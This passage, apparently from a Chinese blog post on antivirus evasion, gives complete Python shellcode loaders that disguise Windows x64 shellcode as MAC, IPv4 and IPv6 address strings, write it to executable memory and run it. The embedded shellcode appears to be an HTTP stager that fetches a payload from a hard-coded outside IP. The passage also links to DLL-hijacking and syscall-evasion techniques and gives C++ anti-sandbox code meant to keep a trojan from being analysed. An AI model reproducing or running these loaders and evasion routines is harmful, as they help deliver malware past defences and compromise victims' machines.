57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x36\x2e\x30\x3b\x20\x4d\x41\x53\x50\x29\x0d\x0a\x00\x36\x33\x5a\x21\x1c\xe3\x65\x2d\x0e\x19\xa1\xd3\x4c\xf9\x56\xc3\x4e\x54\x7e\x1c\x21\x38\x30\xf3\xf7\x7f\x4a\x21\x52\xb8\x55\x9f\xd0\x0f\x25\x99\x79\x4a\x2b\xcc\xd7\x09\x95\x74\x3b\xee\x1c\xfa\xad\xbd\xec\x84\x00\xdb\xd8\x58\x89\xb8\xad\xd3\x86\x5b\xd3\x09\xc2\xcd\xb6\xfd\x9e\x9f\xb2\x26\xc8\xaa\xfc\x0e\xc9\xf8\xa2\xfd\x5c\x99\x91\xb7\x08\x11\xd8\x91\xde\xfe\x43\x95\x1c\x96\x29\x08\x55\x39\x21\x7d\x8c\xd5\xac\x46\x6e\x78\x65\x16\xb9\xf1\x53\xc6\x25\x76\x78\xd7\xfd\xdd\xb0\x7f\x40\xea\x7f\x68\xba\x6e\x5d\x99\x55\x5f\x11\xd9\x05\x90\x92\x2c\x9e\xb3\x75\x5e\x73\x72\x81\x4d\xe0\x00\xa6\x38\x0b\xed\xe5\x4e\xcb\x8d\xd1\x44\x12\xb3\xf8\xd0\x3a\xcc\xd6\x06\xf1\x36\x4f\x8e\x66\x39\x66\x42\xe3\xc7\x74\xa5\xbd\xac\x0d\xe6\xe5\xd3\x53\x0c\x8e\x90\xca\xd3\x01\x0d\x88\x7c\x91\x63\xdb\xe2\xd9\xb3\x4d\x9f\x57\x3b\x64\x31\x8a\x66\xea\x78\xeb\x07\x09\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x34\x33\x2e\x31\x33\x38\x2e\x32\x37\x2e\x31\x32\x00\x49\x96\x02\xd2&quot;</span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line">mac_address = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>, <span class="built_in">len</span>(shellcode) / <span class="number">6</span> * <span class="number">17</span>, <span class="number">0x3000</span>, <span class="number">0x40</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(shellcode) / <span class="number">6</span>):</span><br><span class="line">    cut_byte = shellcode[i * <span class="number">6</span>:<span class="number">6</span> + i * <span class="number">6</span>]</span><br><span class="line">    ctypes.windll.Ntdll.RtlEthernetAddressToStringA(cut_byte, mac_address + i * <span class="number">17</span>)</span><br><span class="line">mac_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(shellcode) // <span class="number">6</span>):</span><br><span class="line">    mac = ctypes.string_at(mac_address + i * <span class="number">17</span>, <span class="number">17</span>)</span><br><span class="line">    mac_list.append(mac)</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>,<span class="built_in">len</span>(mac_list)*<span class="number">6</span>,<span class="number">0x3000</span>,<span class="number">0x04</span>)</span><br><span class="line"></span><br><span class="line">ptr1 = ptr</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mac_list)):</span><br><span class="line">    ctypes.windll.Ntdll.RtlEthernetStringToAddressA(mac_list[i], mac_list[i], ptr1)</span><br><span class="line">    ptr1 += <span class="number">6</span></span><br><span class="line">ctypes.windll.kernel32.VirtualProtect(ptr, <span class="built_in">len</span>(mac_list)*<span class="number">6</span>, <span class="number">0x40</span>, ctypes.byref(ctypes.c_long(<span class="number">1</span>)))</span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, ptr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, -<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="python-ipv4内存加载器"><a href="#python-ipv4内存加载器" class="headerlink" title="python ipv4内存加载器"></a>python ipv4内存加载器</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shellcode填充为4的倍数</span></span><br><span class="line">shellcode = <span class="string">&quot;\xfc\x48\x83......x00\x00&quot;</span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"><span class="comment">#申请ipv4虚拟内存</span></span><br><span class="line">ipv4_address = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>,ctypes.c_int(<span class="built_in">len</span>(shellcode)//<span class="number">4</span>*<span class="number">16</span>),<span class="number">0x3000</span>,<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#将tlIpv4AddressToStringA将shellcode转换为ipv4字符串</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(shellcode)//<span class="number">4</span>):</span><br><span class="line">    cut_byte = shellcode[i*<span class="number">4</span>:<span class="number">4</span>+i*<span class="number">4</span>]</span><br><span class="line">    ctypes.windll.Ntdll.RtlIpv4AddressToStringA(cut_byte, ipv4_address+i*<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">ipv4_list = []</span><br><span class="line"><span class="comment">#获取IPv4 地址的字符串</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(shellcode)//<span class="number">4</span>):</span><br><span class="line">     ipv4_str = ctypes.string_at(ipv4address+i*<span class="number">16</span>,<span class="number">16</span>)</span><br><span class="line">     ipv4_list.append(ipv4_str)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#申请shellcode内存</span></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">0x3000</span>, <span class="number">0x40</span>)</span><br><span class="line">ptr1 = ptr</span><br><span class="line"><span class="comment">#RtlIpv4StringToAddressA将ipv4转为二进制写入内存，内存递归增长4</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ipv4_list)):     </span><br><span class="line">	 ctypes.windll.Ntdll.RtlIpv4StringToAddressA(ipv4_list[i],<span class="literal">False</span>,ipv4_list[i],ptr1)</span><br><span class="line">	 ptr1 += <span class="number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, ptr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, -<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="python-ipv6内存加载器"><a href="#python-ipv6内存加载器" class="headerlink" title="python ipv6内存加载器"></a>python ipv6内存加载器</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">shellcode=<span class="string">b&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x60\x11\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x31\x73\x68\x51\x00\x27\x6b\x08\x03\x3f\x21\xf1\xec\xd6\xc0\x3b\xae\xe3\xab\x55\x82\xf4\x40\xbc\x5b\x9f\xfa\x45\xbd\x37\x51\x3b\xe0\x0d\xa4\x3b\xb2\xd1\xf9\x74\xda\x3a\xd8\x44\xb1\x60\x84\xc5\x83\x10\x70\x5e\x54\x63\xc7\xf8\xf8\x74\x9b\x2b\x6a\x35\x08\xd5\x11\xa9\x32\x98\xec\xd8\x01\xf0\xc4\xae\x4b\x4b\x6c\xba\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x36\x2e\x30\x3b\x20\x4d\x41\x53\x50\x29\x0d\x0a\x00\x36\x33\x5a\x21\x1c\xe3\x65\x2d\x0e\x19\xa1\xd3\x4c\xf9\x56\xc3\x4e\x54\x7e\x1c\x21\x38\x30\xf3\xf7\x7f\x4a\x21\x52\xb8\x55\x9f\xd0\x0f\x25\x99\x79\x4a\x2b\xcc\xd7\x09\x95\x74\x3b\xee\x1c\xfa\xad\xbd\xec\x84\x00\xdb\xd8\x58\x89\xb8\xad\xd3\x86\x5b\xd3\x09\xc2\xcd\xb6\xfd\x9e\x9f\xb2\x26\xc8\xaa\xfc\x0e\xc9\xf8\xa2\xfd\x5c\x99\x91\xb7\x08\x11\xd8\x91\xde\xfe\x43\x95\x1c\x96\x29\x08\x55\x39\x21\x7d\x8c\xd5\xac\x46\x6e\x78\x65\x16\xb9\xf1\x53\xc6\x25\x76\x78\xd7\xfd\xdd\xb0\x7f\x40\xea\x7f\x68\xba\x6e\x5d\x99\x55\x5f\x11\xd9\x05\x90\x92\x2c\x9e\xb3\x75\x5e\x73\x72\x81\x4d\xe0\x00\xa6\x38\x0b\xed\xe5\x4e\xcb\x8d\xd1\x44\x12\xb3\xf8\xd0\x3a\xcc\xd6\x06\xf1\x36\x4f\x8e\x66\x39\x66\x42\xe3\xc7\x74\xa5\xbd\xac\x0d\xe6\xe5\xd3\x53\x0c\x8e\x90\xca\xd3\x01\x0d\x88\x7c\x91\x63\xdb\xe2\xd9\xb3\x4d\x9f\x57\x3b\x64\x31\x8a\x66\xea\x78\xeb\x07\x09\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x34\x33\x2e\x31\x33\x38\x2e\x32\x37\x2e\x31\x32\x00\x49\x96\x02\xd2&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(shellcode) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">    null_byte = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">16</span> - <span class="built_in">len</span>(shellcode) % <span class="number">16</span>)</span><br><span class="line">    shellcode += null_byte</span><br><span class="line">ctypes.windll.Activeds.AllocADsMem.restype = ctypes.c_uint64</span><br><span class="line">ptr_alloc_1 = ctypes.windll.Activeds.AllocADsMem(ctypes.c_int(<span class="built_in">len</span>(shellcode) // <span class="number">16</span> * <span class="number">40</span>))</span><br><span class="line">ptr_realloc_1 = ctypes.windll.Activeds.ReallocADsMem(ptr_alloc_1, <span class="built_in">len</span>(shellcode) // <span class="number">16</span> * <span class="number">40</span>, <span class="built_in">len</span>(shellcode) // <span class="number">16</span> * <span class="number">40</span>)</span><br><span class="line">ctypes.windll.kernel32.VirtualProtect(ptr_realloc_1, ctypes.c_int(<span class="built_in">len</span>(shellcode) // <span class="number">16</span> * <span class="number">40</span>), <span class="number">0x40</span>, ctypes.byref(ctypes.c_long(<span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(shellcode) // <span class="number">16</span>):</span><br><span class="line">    bytes_shellcode = shellcode[i * <span class="number">16</span>: <span class="number">16</span> + i * <span class="number">16</span>]</span><br><span class="line">    ctypes.windll.Ntdll.RtlIpv6AddressToStringA(bytes_shellcode, ptr_realloc_1 + i * <span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">ipv6_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(shellcode) // <span class="number">16</span>):</span><br><span class="line">    ipv6 = ctypes.string_at(ptr_realloc_1 + i * <span class="number">40</span>, <span class="number">40</span>)</span><br><span class="line">    ipv6_list.append(ipv6)</span><br><span class="line"><span class="built_in">print</span>(ipv6_list)</span><br><span class="line"></span><br><span class="line">ptr_alloc_2 = ctypes.windll.Activeds.AllocADsMem(ctypes.c_int(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">ptr_realloc_2 = ctypes.windll.Activeds.ReallocADsMem(ptr_alloc_1, <span class="built_in">len</span>(shellcode), <span class="built_in">len</span>(shellcode))</span><br><span class="line">ctypes.windll.kernel32.VirtualProtect(ptr_realloc_2, ctypes.c_int(<span class="built_in">len</span>(shellcode)), <span class="number">0x40</span>, ctypes.byref(ctypes.c_long(<span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line">rwxpage = ptr_realloc_2</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ipv6_list)):</span><br><span class="line">    ctypes.windll.Ntdll.RtlIpv6StringToAddressA(ipv6_list[i], ipv6_list[i], rwxpage)</span><br><span class="line">    rwxpage += <span class="number">16</span></span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.EnumSystemLocalesW(ptr_realloc_2, <span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="nim-shellcode免杀"><a href="#nim-shellcode免杀" class="headerlink" title="nim shellcode免杀"></a>nim shellcode免杀</h2><p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11052">https://xz.aliyun.com/t/11052</a></p>
<h2 id="特征码修改-–花指令添加-—upx加壳"><a href="#特征码修改-–花指令添加-—upx加壳" class="headerlink" title="特征码修改 –花指令添加 —upx加壳"></a>特征码修改 –花指令添加 —upx加壳</h2><p>思路参考（比较老）</p>
<p><a target="_blank" rel="noopener" href="https://blog.51cto.com/match/1401629">https://blog.51cto.com/match/1401629</a></p>
<p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-97345.htm">https://bbs.kanxue.com/thread-97345.htm</a></p>
<h2 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11711">https://xz.aliyun.com/t/11711</a></p>
<p><a target="_blank" rel="noopener" href="https://f002.backblazeb2.com/file/sec-news-backup/files/writeup/www.freebuf.com/_articles_78807_html/index.html">https://f002.backblazeb2.com/file/sec-news-backup/files/writeup/www.freebuf.com/_articles_78807_html&#x2F;index.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/324598.html">https://www.freebuf.com/articles/system/324598.html</a></p>
<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1365/#toc_0x09">https://tttang.com/archive/1365/#toc_0x09</a></p>
<p><a target="_blank" rel="noopener" href="https://sec-in.com/article/1562">https://sec-in.com/article/1562</a></p>
<p><a target="_blank" rel="noopener" href="https://skewwg.github.io/2020/11/26/diao-yu-yu-she-gong-xi-lie-zhi-dll-jie-chi/">https://skewwg.github.io/2020/11/26/diao-yu-yu-she-gong-xi-lie-zhi-dll-jie-chi/</a></p>
<h2 id="syscall免杀介绍："><a href="#syscall免杀介绍：" class="headerlink" title="syscall免杀介绍："></a>syscall免杀介绍：</h2><p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11448">https://xz.aliyun.com/t/11448</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11496#toc-2">https://xz.aliyun.com/t/11496#toc-2</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11532#toc-11">https://xz.aliyun.com/t/11532#toc-11</a></p>
<h2 id="反沙箱检测"><a href="#反沙箱检测" class="headerlink" title="反沙箱检测"></a>反沙箱检测</h2><p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/202717.html">https://www.freebuf.com/articles/system/202717.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/186218">https://www.anquanke.com/post/id/186218</a></p>
<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/758">https://forum.butian.net/share/758</a></p>
<p><a target="_blank" rel="noopener" href="https://drunkmars.top/2021/10/04/%E5%8F%8D%E6%B2%99%E7%AE%B1%E8%B0%83%E8%AF%95/">https://drunkmars.top/2021/10/04/%E5%8F%8D%E6%B2%99%E7%AE%B1%E8%B0%83%E8%AF%95/</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">很多杀软都有自己的后端云沙箱，这些沙箱能够模拟出软件执行所需的运行环境，通过进程hook技术来对软件执行过程中的行为进行分析，判断其是否有敏感的操作行为，或者更高级的检测手法是，将获取到的程序的API调用序列以及其他的一些行为特征输入到智能分析引擎中进行检测。所以，如果我们的木马没有做好反调试，很容易就被沙箱检测出来。</span><br><span class="line"></span><br><span class="line">前言</span><br><span class="line">最简单的反调试的措施就是检测父进程。一般来说，我们手动点击执行的程序的父进程都是explorer。如果一个程序的父进程不是explorer，那么我们就可以认为他是由沙箱启动的。那么我们就直接exit退出，这样，杀软就无法继续对我们进行行为分析了。</span><br><span class="line"></span><br><span class="line">这里主要的思路是获取调用kernel32库中的CreateToolhelp32Snapshot函数获得一个进程快照信息，然后从快照中获取到explorer.exe的进程id信息，然后通过当前进程的pid信息在进程快照中找到其父进程的id信息，最后将两者进行比较，判断当前进程是否是有人工启动的。</span><br><span class="line"></span><br><span class="line">反调试的措施不仅仅是检测父进程，还可以通过调用windows的API接口IsDebuggerPresent来检查当前进程是否正在被调试。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>代码：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">get_parent_processid</span><span class="params">(DWORD pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD ParentProcessID = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    PROCESSENTRY32 pe;</span><br><span class="line"></span><br><span class="line">    HANDLE hkz;</span><br><span class="line"></span><br><span class="line">    HMODULE hModule = <span class="built_in">LoadLibrary</span>(_T(<span class="string">&quot;Kernel32.dll&quot;</span>));</span><br><span class="line"></span><br><span class="line">    FARPROC Address = <span class="built_in">GetProcAddress</span>(hModule, <span class="string">&quot;CreateToolhelp32Snapshot&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (Address == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">OutputDebugString</span>(_T(<span class="string">&quot;GetProc error&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    _asm &#123;</span><br><span class="line">        push <span class="number">0</span></span><br><span class="line">        push <span class="number">2</span></span><br><span class="line">        call Address</span><br><span class="line">    mov hkz, eax</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">pe.dwSize = <span class="built_in">sizeof</span>(PROCESSENTRY32);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Process32First</span>(hkz, &amp;pe)) &#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (pe.th32ProcessID == pid) &#123;</span><br><span class="line">            ParentProcessID = pe.th32ParentProcessID;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; 		<span class="keyword">while</span> (<span class="built_in">Process32Next</span>(hkz, &amp;pe));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ParentProcessID;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">get_explorer_processid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DWORD explorer_id = <span class="number">-1</span>;</span><br><span class="line">    PROCESSENTRY32 pe;</span><br><span class="line">    HANDLE hkz;</span><br><span class="line">    HMODULE hModule = <span class="built_in">LoadLibrary</span>(_T(<span class="string">&quot;Kernel32.dll&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hModule == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">OutputDebugString</span>(_T(<span class="string">&quot;Loaddll error&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    FARPROC Address = <span class="built_in">GetProcAddress</span>(hModule, <span class="string">&quot;CreateToolhelp32Snapshot&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (Address == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">OutputDebugString</span>(_T(<span class="string">&quot;GetProc error&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    _asm &#123;</span><br><span class="line">        push <span class="number">0</span></span><br><span class="line">        push <span class="number">2</span></span><br><span class="line">        call Address</span><br><span class="line">    mov hkz, eax</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">pe.dwSize = <span class="built_in">sizeof</span>(PROCESSENTRY32);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Process32First</span>(hkz, &amp;pe)) &#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_wcsicmp(pe.szExeFile, <span class="string">L&quot;explorer.exe&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            explorer_id = pe.th32ProcessID;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; 		<span class="keyword">while</span> (<span class="built_in">Process32Next</span>(hkz, &amp;pe));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> explorer_id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span 